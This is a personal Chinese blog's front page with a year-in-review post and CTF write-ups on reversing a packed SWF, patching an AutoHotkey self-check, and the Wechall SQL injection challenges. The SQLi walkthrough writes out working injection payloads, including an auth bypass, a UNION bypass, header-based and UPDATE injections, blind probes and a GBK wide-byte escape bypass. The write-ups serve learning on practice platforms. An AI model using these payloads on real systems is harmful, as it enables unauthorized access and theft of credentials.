<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<title>这真的是首页喵ww</title>
		<link rel="stylesheet" href="/static/init.css" type="text/css">
		<link rel="stylesheet" href="/static/yue.css" type="text/css">
		<link rel="stylesheet" href="/static/blog.css" type="text/css">
		<link rel="alternate" href="/rss.xml" type="application/rss+xml"/>
		<link rel="alternate" href="/atom.xml" type="application/atom+xml"/>
	</head>
	<body>
		<div id="page">
			<main class="yue">
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/2016.html">2016-2017</a></h1>
				<aside class="time">
					Posted at
					<time>2017-02-03 00:25:00</time>
				</aside>
				<section class="post-content">
					<h2>2016</h2>

<p>一眨眼又过了一年。<br />
这一年得益于在大学的宽松环境，做了很多自己之前想做但是没机会做的事情。</p>

<ul>
<li>逆向总算是学了个入门了。和队友一起打了不少比赛。也在校内折腾一场比赛。组织能力一如既往的弱，还好有小伙伴们一起折腾Orz。<br /></li>
<li>算法依然处于只知道名字的地步，就各种比赛前学过一些，还是非常弱。<br /></li>
<li>写了个一两个网站项目（<a href="https://github.com/Njupt-Sast-Network/NICP-Node">NICP-Node</a> 等），大概有能力自己写一个小型的网站出来了。也对网站开发有了更深的一些理解，不再单纯的迷信某个语言或者某种结构。<br /></li>
<li>在[一个社团]()做类似运维的工作。GitLab，代码部署系统什么的都搭了一下。也尝试自己写了个基于 PHP 和 Git 的代码部署系统 Meidochan。不过后来因为找到了功能更全的walle，也就没有再做更进一步的开发。总体感想是 devops 非常重要，能够极大的提升迭代的速度，还能同时改善运维和开发的工作条件。<br /></li>
<li>还是上面这个社团的工作，让我对网站的可用性还有性能调优有了一些了解。<br /></li>
<li>了解了关于 web 开发的很多东西，也了解了别的很多方向，更加坚定了做 web 后端或者服务器开发的想法。<br /></li>
<li>在<a href="https://sast.njupt.edu.cn/">校科协</a>做了一些事情。南邮的校科协好像是国内高校科协中比较独特的，除了处理各种事务的办公部门以外，还有专门的技术中心。技术中心几个部门集合了校内一批各种技术爱好者，并且通过高年级给低年级授课的方式不断延续下来。总之在这边做事情很开心，恰到好处的技术氛围让人很舒服。<br /></li>
<li>除了一个没跑完早操导致的体育挂科以外没有挂科。不过绩点很难看。<br /></li>
<li>有玩的熟的异性朋友，但是仍然没有女票（sad<br />
<br /></li>
</ul>

<p>##2017<br />
感觉还是要列个计划的。</p>

<ul>
<li>继续抢救算法<br /></li>
<li>计算机组成，操作系统的知识<br /></li>
<li>网络方向。TCP/IP协议什么的，还有 linux 下的网络编程<br /></li>
<li>想学点 pwn ，恩。<br /></li>
<li>符号执行 形式化证明好像挺好玩的，应该了解一下<br /></li>
<li>机器学习这些玄学，还是要了解下的，虽然可能没能力去自己写，但是原理啥的还是要懂的<br /></li>
<li>多接触接触硬件，开阔下视野。<br /></li>
<li><del>学画画?</del><br />
<br /></li>
</ul>

<p>项目方面：</p>

<ul>
<li>[ ] 某社团 API 的开放<br /></li>
<li>[ ] 更优秀的校内信息抓取方案<br /></li>
<li>[ ] 实现一个小小的操作系统，主要的大功能有了就好<br />
<br /></li>
</ul>

<p>目前就这两个，更多的放到2017总结去写好了。<br />
总之多走出舒适区，多去学新东西。另外不随便接活了Orz。</p>

				</section>
			</article>
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/geekpwnctf_hugme.html">GeekPwnCTF2016 qual HugMe-300</a></h1>
				<aside class="time">
					Posted at
					<time>2016-09-25 12:26:00</time>
				</aside>
				<section class="post-content">
					<p>一个加了壳的swf(后来知道是doswf的壳)</p>

<p>先preload挂个TheMiner，然后看loader的内容，脱去第一层壳。</p>

<p><img src="/static/hugme/14747777552556.jpg" alt="" /></p>

<p>反编译取出的swf，发现一个坑<br />
<img src="/static/hugme/14747780161994.jpg" alt="" /><br />
显示出来的hugme啥用都没有。。。需要点击的那个hugme又没被正确加载。。需要自己做修改<br />
然后才能看见真正的按钮<br />
<img src="/static/hugme/14747781328451.jpg" alt="" /></p>

<p>接着关键的判断逻辑。<br />
<img src="/static/hugme/14747778722896.jpg" alt="" /><br />
然而Verify运行时才载入。。<br />
<img src="/static/hugme/14747782423072.jpg" alt="" /><br />
于是再次脱壳。。。TheMiner没hook loadBytes,所以这里只能自己来<br />
提取出这个函数运行然后把uncompress的结果base64一下，trace打出来。<br />
然后再用python保存成文件。(不会actionscript的文件读写只好这么搞)</p>

<p>然后反编译保存下来的文件，发现校验过程其实就是个方程组<br />
<img src="/static/hugme/14747785230624.jpg" alt="" /><br />
method3没用。。只要符合method2里的方程组，method3一定符合。</p>

<p>然后就是求解方程组得到一组解[14,0,1,14,14,14,13,0,9,3,12,11,2,2,11]<br />
对应的flag e01eeed093cb22b<br />
然而这才15位 。。根据readme的提示，枚举最后一位。。发现e01eeed093cb22bb是hello world的md5</p>

<p>故flag为e01eeed093cb22bb</p>

				</section>
			</article>
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/reversing_kr_autohotkey2.html">reversing.kr AutoHotkey2</a></h1>
				<aside class="time">
					Posted at
					<time>2016-02-15 22:30:00</time>
				</aside>
				<section class="post-content">
					<p>有autohotkey自带的upx壳<br />
<img src="/static/upx.png" alt="upx" /><br />
还有自校验。。</p>

<p>这题给的文件是修改过的，所以无法通过自校验<br />
<img src="/static/corrupt.png" alt="corrupt" /></p>

<p>考虑到有自校验，所以就没有先脱壳。<br />
直接带壳调试，用堆栈平衡很快找到OEP=00442B4F<br />
<img src="/static/oep.png" alt="oep" /></p>

<p>然后可以看到第一个关键跳转：<br />
<img src="/static/check1.png" alt="check1" /><br />
448265必须跳<br />
跟进4508C7，是在计算校验值，并判断。<br />
<img src="/static/check_cmp1.png" alt="check_cmp1" /><br />
ebp-0x10其实是文件的最后四个字节<br />
<img src="/static/checksum1.png" alt="checksu" /><br />
所以文件的最后四个字节是计算出的校验值异或0xAAAAAAAA之后得到的值</p>

<p>程序接下来直接利用文件倒数第八到倒数第五个字节作为附加数据开始地址，读取附加数据开头，然后开始判断是否为附加数据,即判断开头是否是以下16个字节<br />
A3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D<br />
<img src="/static/check2.png" alt="check2" /><br />
所以文件的倒数第八到倒数第五个字节是附加数据开始地址<br />
用16进制编辑器可以找到真正的附加数据开头<br />
<img src="/static/offest1.png" alt="offest1" /><br />
然后只需要修正文件的最后8个字节即可，注意修改附加数据地址也会改变校验值，所以应该先修改附加数据地址，再修改校验值。<br />
最后的修改如下<br />
<img src="/static/patch-1.png" alt="patch" /><br />
然后程序就能正常运行了<br />
<img src="/static/result.png" alt="result" /><br />
百度一下即可找到答案jonsnow</p>

<h2>参考文章</h2>

<p><a href="http://bbs.pediy.com/showthread.php?threadid=21910">简析AutoIt程序脱壳后的自校验处理_看雪</a><br />
（这篇文章里讲的是autoit的自校验，比autohotkey的稍微复杂一些（多了一次校验），但是基本方法是一样的，当时看这个文章得到不少思路）</p>

				</section>
			</article>
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/wechall_sql.html">Wechall SQLI</a></h1>
				<aside class="time">
					Posted at
					<time>2015-11-09 12:00:00</time>
				</aside>
				<section class="post-content">
					<p>这些题是为了准备安恒杯校内个人赛做的，<del>虽然后来还是没做出安恒杯的sql注入（据说只要用sqlmap扫就行？）</del></p>

<h2>MySQL1</h2>

<p>基础入门题<br />
username完全无过滤，可以直接去掉密码验证<br />
查询语句</p>

<pre><code class="language-sql">SELECT * FROM users WHERE username='$username' AND password='$password'
</code></pre>

<p>构造：</p>

<pre><code class="language-sql">SELECT * FROM users WHERE username='admin' or ''='' AND password='$password'
</code></pre>

<p>传说中的万能密码的原理  admin&rsquo; or &ldquo;=&rsquo;</p>

<h2>MySQL2</h2>

<p>依然基础题，南邮的平台上遇到过类似的。<br />
先用用户名取出密码，然后比对密码。只要让sql语句返回一个假的密码就OK了。<br />
查询语句：</p>

<pre><code class="language-sql">SELECT * FROM users WHERE username='$username'
</code></pre>

<p>构造：</p>

<pre><code class="language-sql">SELECT * FROM users WHERE username='admin' and 1=2 union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'
</code></pre>

<p>注意PHP的md5函数得到的是32位小写的md5</p>

<h2>The Guestbook</h2>

<pre><code class="language-sql">INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '$ip', '$message')
</code></pre>

<p>ip message都是注入点。<br />
ip好像不太好注入。<br />
message可以注。<br />
构造：</p>

<pre><code class="language-sql">INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '$ip', 'aaa') #')
</code></pre>

<p>然而有一个<code>mysql_real_escape_string</code>，会自动转译。搜了一下可以通过宽字符绕过。</p>

<p>例子：</p>

<pre><code class="language-php">&lt;?php  
    header('Content-Type: text/html; charset=GBK');  
    $input = chr(0xbf) . chr(0x27) . ' OR username = username; /*';  
    $value = addslashes($input);  
    $sql = &quot;SELECT * FROM users WHERE username='{$value}' AND password='123123';&quot;;  
  
    echo $value;  
    echo '&lt;br&gt;';  
    echo $sql;  
    echo '&lt;br&gt;';  
</code></pre>

<p>chr(0xbf) 和 chr(0x27)相连接, 构成一个双字节字符(0xbf27)… 而0xbf27只是一个人为合成的双字节, 不在GBK编码表里, 也就是说不是一个合法的GBK双字节字符… 系统（mysql）会把这个双字节拆分为2个单字节解析(也就是0xbf和0x27), 而<code>addslashes</code>并不知道它是非法的双字节字符, 单引号的GBK编码就是chr(0x27), 单独使用使<code>addslashes</code>是可以识别的&hellip;</p>

<p>然而这个洞已经在mysql5.0.x修复了。。作罢</p>

<p>只能从IP注入了。。上burpsuite，加一个X-Forwarded-For</p>

<p>构造：</p>

<pre><code class="language-sql">INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '127.0.0.1',(select gbu_password from gbook_user where  gbu_name='admin'))#‘, '$message')
</code></pre>

<p>其实中间复习了一波sql语句。。但是没搞懂怎么在insert语句里用select的结果。。后来发现加一对括号足以。。。</p>

<h2>No Escape</h2>

<p>要刷票233333<br />
关键语句：</p>

<pre><code class="language-sql">UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1
</code></pre>

<p>构造：</p>

<pre><code class="language-sql">UPDATE noescvotes SET `george`=`george`+100 #`=`george`+1 WHERE id=1
</code></pre>

<p>实际的url参数：</p>

<pre><code class="language-url">?vote_for=george`=`george`%2b111%23
</code></pre>

<p>注意url转义</p>

<h2>Blinded by the light</h2>

<p>目标是获取  an md5 password hash<br />
盲注<br />
关键语句</p>

<pre><code class="language-sql">SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'
</code></pre>

<p><code>'union select '1'#</code>直接可以登陆，然而它要密码。。<br />
<code>'or'1'='1'#</code>正确的情况<br />
<code>'or'1'='2'#</code>错误的情况<br />
<code>'or password=password#</code><br />
发现生成的hash只有ABCDEF0123456789这些字符，就是一个32位的16进制的数<br />
<code>'or password=0#</code>正确。。<br />
弃治看题解。。<br />
题解提到了一个sql函数substring。。<br />
于是去补了一通sql函数</p>

<pre><code class="language-sql">CONCAT( 字串1, 字串2, 字串3, ...)  
SUBSTR (str, pos, len) 
SUBSTR (str, pos)
TRIM（）
Length (str)
REPLACE (Region_Name, 'ast', 'astern')
</code></pre>

<p><code>#</code>是个很不靠谱的注释符号<br />
还是用<code>--</code>比较好</p>

<p>最后的解法是二分猜解<br />
解题代码直接看乌云的题解吧。。。</p>

<h2>参考资料</h2>

<p><a href="http://drops.wooyun.org/tips/7299">MySQL注入技巧_乌云</a><br />
<a href="http://drops.wooyun.org/papers/1321">wechall mysql关卡题解_乌云</a></p>

				</section>
			</article>
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/hello_blogo.html">Hello Blogo</a></h1>
				<aside class="time">
					Posted at
					<time>2015-10-10 09:42:00</time>
				</aside>
				<section class="post-content">
					<p>这个叫blogo的静态博客生成器终于算是基本完成了，这篇文章的发布时间使用的是blogo第一个commit的时间，仔细一看确实是拖了好久啊。现在(1457181826)终于把这个坑填完了。。</p>

<p>一直认为博客的程序应该要自己写，断断续续写了好多。。拿dw点出来的ASP+Access的版本啊，PHP的版本啊，node的版本啊，一直到现在这个Go写的Blogo。</p>

<p>然而前面的那些都因为各种原因只在本地跑过，从未真正可以被外界访问。这个Blogo是第一个真正投入使用的版本。看到博客成功被push到Github上的时候很开心啊。</p>

<p>评论部分暂且用了多说，不排除未来用disqus的可能性。</p>

<p>最后是一波感谢：<br />
生成器部分参考了天天大神的<a href="https://github.com/whtsky/Catsup">Catsup</a><br />
前端参考了萝莉聚聚的<a href="http://www.ricter.me">ricter.me</a><br />
灰常感谢</p>

<hr />

<p>你问背景是谁？背景是我头像的女票。没错。。头像的。。我头像有女票你怕不怕<del>(好像是个悲伤的故事)</del>233333</p>

				</section>
			</article>
			
			</main>
			<div id="right">
				<div id="float">
					<img id="logo" src="/static/logo.jpg">
					<p class="name">Wxy's</p>
					</img>
					
					<nav>
						<ul>
							<li class="now"><a href="">Home</a></li>
							<li><a href="/archive.html">Archives</a></li>
							<li><a href="/links.html">Links</a></li>
							<li><a href="/about.html">About</a></li>
						</ul>
					</nav>
				</div>
			</div>
		</div>
		<footer id="footer">
			Powered by Blogo
		</footer>
		<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.0.0/styles/default.min.css">
		<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
	</body>
</html>